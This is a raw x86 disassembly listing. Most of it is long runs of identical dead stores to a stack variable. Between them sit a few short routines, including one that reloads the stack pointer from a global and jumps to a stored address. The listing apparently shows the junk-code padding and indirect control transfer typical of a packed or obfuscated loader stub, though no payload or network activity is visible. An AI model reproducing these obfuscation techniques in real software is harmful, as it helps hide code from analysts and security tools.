  41d6e7:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6ee:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6f5:	mov    DWORD PTR [ebp-0x4],0x3085
  41d6fc:	mov    DWORD PTR [ebp-0x4],0x3085
  41d703:	mov    DWORD PTR [ebp-0x4],0x3085
  41d70a:	mov    DWORD PTR [ebp-0x4],0x3085
  41d711:	mov    DWORD PTR [ebp-0x4],0x3085
  41d718:	mov    DWORD PTR [ebp-0x4],0x3085
  41d71f:	mov    DWORD PTR [ebp-0x4],0x3085
  41d726:	mov    DWORD PTR [ebp-0x4],0x3085
  41d72d:	mov    DWORD PTR [ebp-0x4],0x3085
  41d734:	mov    DWORD PTR [ebp-0x4],0x3085
  41d73b:	mov    DWORD PTR [ebp-0x4],0x3085
  41d742:	mov    DWORD PTR [ebp-0x4],0x3085
  41d749:	mov    DWORD PTR [ebp-0x4],0x3085
  41d750:	mov    DWORD PTR [ebp-0x4],0x3085
  41d757:	mov    DWORD PTR [ebp-0x4],0x3085
  41d75e:	mov    DWORD PTR [ebp-0x4],0x3085
  41d765:	mov    DWORD PTR [ebp-0x4],0x3085
  41d76c:	mov    DWORD PTR [ebp-0x4],0x3085
  41d773:	mov    DWORD PTR [ebp-0x4],0x3085
  41d77a:	mov    DWORD PTR [ebp-0x4],0x3085
  41d781:	mov    DWORD PTR [ebp-0x4],0x3085
  41d788:	mov    DWORD PTR [ebp-0x4],0x3085
  41d78f:	mov    DWORD PTR [ebp-0x4],0x3085
  41d796:	mov    DWORD PTR [ebp-0x4],0x3085
  41d79d:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7a4:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7ab:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7b2:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7b9:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7c0:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7c7:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7ce:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7d5:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7dc:	mov    DWORD PTR [ebp-0x4],0x3085
  41d7e3:	cmp    DWORD PTR [ebp+0x8],0x1
  41d7e7:	jne    0x41d7f1
  41d7e9:	mov    eax,ds:0x423140
  41d7ee:	mov    DWORD PTR [ebp+0x8],eax
  41d7f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41d7f4:	push   ecx
  41d7f5:	mov    edx,DWORD PTR [ebp+0xc]
  41d7f8:	push   edx
  41d7f9:	mov    eax,DWORD PTR [ebp+0x8]
  41d7fc:	push   eax
  41d7fd:	call   0x41e8e0
  41d802:	add    esp,0xc
  41d805:	mov    ecx,DWORD PTR [ebp+0x8]
  41d808:	push   ecx
  41d809:	call   0x41d600
  41d80e:	add    esp,0x4
  41d811:	mov    DWORD PTR [ebp+0x8],eax
  41d814:	mov    eax,DWORD PTR [ebp+0x8]
  41d817:	mov    esp,ebp
  41d819:	pop    ebp
  41d81a:	ret    
  41d81b:	int3   
  41d81c:	int3   
  41d81d:	int3   
  41d81e:	int3   
  41d81f:	int3   
  41d820:	push   ebp
  41d821:	mov    ebp,esp
  41d823:	push   ecx
  41d824:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d82b:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d832:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d839:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d840:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d847:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d84e:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d855:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d85c:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d863:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d86a:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d871:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d878:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d87f:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d886:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d88d:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d894:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d89b:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8a2:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8a9:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8b0:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8b7:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8be:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8c5:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8cc:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8d3:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8da:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8e1:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8e8:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8ef:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8f6:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d8fd:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d904:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d90b:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d912:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d919:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d920:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d927:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d92e:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d935:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d93c:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d943:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d94a:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d951:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d958:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d95f:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d966:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d96d:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d974:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d97b:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d982:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d989:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d990:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d997:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d99e:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9a5:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9ac:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9b3:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9ba:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9c1:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9c8:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9cf:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9d6:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9dd:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9e4:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9eb:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9f2:	mov    DWORD PTR [ebp-0x4],0x22a7
  41d9f9:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da00:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da07:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da0e:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da15:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da1c:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da23:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da2a:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da31:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da38:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da3f:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da46:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da4d:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da54:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da5b:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da62:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da69:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da70:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da77:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da7e:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da85:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da8c:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da93:	mov    DWORD PTR [ebp-0x4],0x22a7
  41da9a:	mov    DWORD PTR [ebp-0x4],0x22a7
  41daa1:	mov    DWORD PTR [ebp-0x4],0x22a7
  41daa8:	mov    DWORD PTR [ebp-0x4],0x22a7
  41daaf:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dab6:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dabd:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dac4:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dacb:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dad2:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dad9:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dae0:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dae7:	mov    DWORD PTR [ebp-0x4],0x22a7
  41daee:	mov    DWORD PTR [ebp-0x4],0x22a7
  41daf5:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dafc:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db03:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db0a:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db11:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db18:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db1f:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db26:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db2d:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db34:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db3b:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db42:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db49:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db50:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db57:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db5e:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db65:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db6c:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db73:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db7a:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db81:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db88:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db8f:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db96:	mov    DWORD PTR [ebp-0x4],0x22a7
  41db9d:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dba4:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dbab:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dbb2:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dbb9:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dbc0:	mov    DWORD PTR [ebp-0x4],0x22a7
  41dbc7:	mov    eax,ds:0x423144
  41dbcc:	sub    eax,0x8
  41dbcf:	mov    ds:0x423144,eax
  41dbd4:	mov    ecx,DWORD PTR ds:0x423144
  41dbda:	mov    DWORD PTR [ebp-0x4],ecx
  41dbdd:	mov    edx,DWORD PTR [ebp-0x4]
  41dbe0:	shr    edx,1
  41dbe2:	mov    DWORD PTR [ebp-0x4],edx
  41dbe5:	mov    eax,DWORD PTR [ebp-0x4]
  41dbe8:	mov    ds:0x423144,eax
  41dbed:	mov    esp,ebp
  41dbef:	pop    ebp
  41dbf0:	ret    
  41dbf1:	int3   
  41dbf2:	int3   
  41dbf3:	int3   
  41dbf4:	int3   
  41dbf5:	int3   
  41dbf6:	int3   
  41dbf7:	int3   
  41dbf8:	int3   
  41dbf9:	int3   
  41dbfa:	int3   
  41dbfb:	int3   
  41dbfc:	int3   
  41dbfd:	int3   
  41dbfe:	int3   
  41dbff:	int3   
  41dc00:	push   ebp
  41dc01:	mov    ebp,esp
  41dc03:	mov    edx,edx
  41dc05:	mov    esp,DWORD PTR ds:0x423148
  41dc0b:	mov    edx,edx
  41dc0d:	add    esp,0x4
  41dc10:	mov    edx,edx
  41dc12:	mov    ecx,DWORD PTR ds:0x42314c
  41dc18:	mov    edx,edx
  41dc1a:	jmp    ecx
  41dc1c:	mov    edx,edx
  41dc1e:	pop    ebp
  41dc1f:	ret    
  41dc20:	push   ebp
  41dc21:	mov    ebp,esp
  41dc23:	call   0x41d5e0
  41dc28:	mov    eax,ds:0x423134
  41dc2d:	push   eax
  41dc2e:	call   0x41d610
  41dc33:	add    esp,0x4
  41dc36:	mov    ds:0x42312c,eax
  41dc3b:	pop    ebp
  41dc3c:	ret    
  41dc3d:	int3   
  41dc3e:	int3   
  41dc3f:	int3   
  41dc40:	push   ebp
  41dc41:	mov    ebp,esp
  41dc43:	sub    esp,0x28
  41dc46:	mov    DWORD PTR [ebp-0x28],0x4014d8
  41dc4d:	mov    DWORD PTR [ebp-0x24],0x1027
  41dc54:	mov    DWORD PTR [ebp-0x18],0x4
  41dc5b:	mov    eax,DWORD PTR [ebp-0x18]
  41dc5e:	mov    ecx,DWORD PTR [ebp-0x28]
  41dc61:	lea    edx,[ecx+eax*1+0x29]
  41dc65:	mov    DWORD PTR [ebp-0x20],edx
  41dc68:	mov    eax,DWORD PTR [ebp-0x20]
  41dc6b:	mov    DWORD PTR [ebp-0x1c],eax
  41dc6e:	mov    DWORD PTR [ebp-0x14],0x0
  41dc75:	lea    ecx,[ebp-0x14]
  41dc78:	push   ecx
  41dc79:	push   0x0
  41dc7b:	call   DWORD PTR ds:0x422464
  41dc81:	cmp    DWORD PTR [ebp-0x14],0x0
  41dc85:	jne    0x41dc8b
  41dc87:	xor    eax,eax
  41dc89:	jmp    0x41dc97
  41dc8b:	mov    edx,DWORD PTR [ebp-0x1c]
  41dc8e:	sub    edx,0x29
  41dc91:	mov    DWORD PTR ds:0x423134,edx
  41dc97:	mov    esp,ebp
  41dc99:	pop    ebp
  41dc9a:	ret    
  41dc9b:	int3   
  41dc9c:	int3   
  41dc9d:	int3   
  41dc9e:	int3   
  41dc9f:	int3   
  41dca0:	push   ebp
  41dca1:	mov    ebp,esp
  41dca3:	sub    esp,0xc
  41dca6:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcad:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcb4:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcbb:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcc2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcc9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcd0:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcd7:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcde:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dce5:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcec:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcf3:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dcfa:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd01:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd08:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd0f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd16:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd1d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd24:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd2b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd32:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd39:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd40:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd47:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd4e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd55:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd5c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd63:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd6a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd71:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd78:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd7f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd86:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd8d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd94:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dd9b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dda2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dda9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddb0:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddb7:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddbe:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddc5:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddcc:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddd3:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddda:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dde1:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dde8:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddef:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddf6:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ddfd:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de04:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de0b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de12:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de19:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de20:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de27:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de2e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de35:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de3c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de43:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de4a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de51:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de58:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de5f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de66:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de6d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de74:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de7b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de82:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de89:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de90:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de97:	mov    DWORD PTR [ebp-0xc],0x1024a
  41de9e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dea5:	mov    DWORD PTR [ebp-0xc],0x1024a
  41deac:	mov    DWORD PTR [ebp-0xc],0x1024a
  41deb3:	mov    DWORD PTR [ebp-0xc],0x1024a
  41deba:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dec1:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dec8:	mov    DWORD PTR [ebp-0xc],0x1024a
  41decf:	mov    DWORD PTR [ebp-0xc],0x1024a
  41ded6:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dedd:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dee4:	mov    DWORD PTR [ebp-0xc],0x1024a
  41deeb:	mov    DWORD PTR [ebp-0xc],0x1024a
  41def2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41def9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df00:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df07:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df0e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df15:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df1c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df23:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df2a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df31:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df38:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df3f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df46:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df4d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df54:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df5b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df62:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df69:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df70:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df77:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df7e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df85:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df8c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df93:	mov    DWORD PTR [ebp-0xc],0x1024a
  41df9a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfa1:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfa8:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfaf:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfb6:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfbd:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfc4:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfcb:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfd2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfd9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfe0:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfe7:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dfee:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dff5:	mov    DWORD PTR [ebp-0xc],0x1024a
  41dffc:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e003:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e00a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e011:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e018:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e01f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e026:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e02d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e034:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e03b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e042:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e049:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e050:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e057:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e05e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e065:	mov    eax,DWORD PTR [ebp+0x8]
  41e068:	cmp    DWORD PTR [eax+0x4],0x0
  41e06c:	je     0x41e469
  41e072:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e079:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e080:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e087:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e08e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e095:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e09c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0a3:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0aa:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0b1:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0b8:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0bf:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0c6:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0cd:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0d4:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0db:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0e2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0e9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0f0:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0f7:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e0fe:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e105:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e10c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e113:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e11a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e121:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e128:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e12f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e136:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e13d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e144:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e14b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e152:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e159:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e160:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e167:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e16e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e175:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e17c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e183:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e18a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e191:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e198:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e19f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1a6:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1ad:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1b4:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1bb:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1c2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1c9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1d0:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1d7:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1de:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1e5:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1ec:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1f3:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e1fa:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e201:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e208:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e20f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e216:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e21d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e224:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e22b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e232:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e239:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e240:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e247:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e24e:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e255:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e25c:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e263:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e26a:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e271:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e278:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e27f:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e286:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e28d:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e294:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e29b:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2a2:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2a9:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2b0:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2b7:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2be:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2c5:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2cc:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2d3:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2da:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2e1:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2e8:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2ef:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2f6:	mov    DWORD PTR [ebp-0xc],0x1024a
  41e2fd:	mov    DWORD PTR [ebp-0xc],0x1024a
